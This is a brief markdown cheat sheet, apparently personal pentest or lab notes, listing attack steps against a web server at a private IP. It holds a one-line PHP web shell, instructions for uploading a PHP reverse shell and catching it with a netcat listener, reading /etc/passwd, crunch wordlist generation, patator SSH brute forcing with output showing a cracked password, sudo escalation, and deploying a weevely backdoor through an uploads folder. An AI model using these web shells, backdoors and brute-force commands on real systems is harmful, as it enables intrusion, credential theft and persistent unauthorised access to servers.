# php shell

## web shell

-   Create a new php script
    ```php
    <?php system($_GET['cmd']); ?>
    ```
-   upload to the server
-   open url with the cmd GET parameter

## reverse shell

-   clone [pentestmonkey/php-reverse-shell](https://github.com/pentestmonkey/php-reverse-shell)
-   Change ip and port to your ip and port
-   upload to server
-   listen to the port with `nc -v -n -l -p 8000`
-   start the script by opening the url

## ssh brute force

-   find a potential ssh user
    -   `cat /etc/passwd` => `user:x:1000:1000:Debian Live user,,,:/home/user:/bin/bash`
-   Generate a word list
    -   install crunch `sudo apt install crunch`
    -   `crunch 4 4 evil -o wordlist.txt`
-   Brute force the authentication
    -   install patator `sudo apt install patator`
    -   `patator ssh_login host=192.168.44.130 user=user password=FILE0 0=~/wordlist.txt -x ignore:mesg='Authentication failed.'`
        ```
        13:05:26 patator    INFO -
        13:05:26 patator    INFO - code  size    time | candidate                          |   num | mesg
        13:05:26 patator    INFO - -----------------------------------------------------------------------------
        13:06:17 patator    INFO - 0     39     0.005 | live                               |   229 | SSH-2.0-OpenSSH_5.5p1 Debian-6+squeeze2
        13:06:27 patator    INFO - Hits/Done/Skip/Fail/Size: 1/256/0/0/256, Avg: 4 r/s, Time: 0h 1m 0s
        ```
## ssh login

- `ssh user@192.168.44.130`
- elevation `sudo -s`

## reverse shell weevely

- `sudo apt install weevely python3-distutils`
- generate script `weevely generate 'Pa$$w0rd' shell.php3`
- upload script to server
- listen for connection `weevely http://192.168.44.130/admin/uploads/shell.php3 'Pa$$w0rd'`